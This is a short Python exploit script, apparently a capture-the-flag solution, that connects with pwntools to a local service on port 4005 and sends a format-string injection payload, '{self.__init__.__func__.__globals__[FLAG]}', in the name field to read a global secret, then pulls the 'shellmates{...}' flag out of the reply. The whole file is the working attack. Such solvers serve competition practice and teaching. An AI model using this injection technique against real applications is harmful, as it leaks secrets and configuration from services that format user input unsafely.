#!/usr/bin/env python3

from pwn import *

HOST, PORT = "localhost", 4005

if __name__ == "__main__":
    io = remote(HOST, PORT)

    payload = "{self.__init__.__func__.__globals__[FLAG]}"
    io.sendlineafter("Name: ", payload)

    line = io.recvline().decode()
    flag = re.search(r"shellmates{.*?}", line).group(0)

    log.success(f"Flag : {flag}")
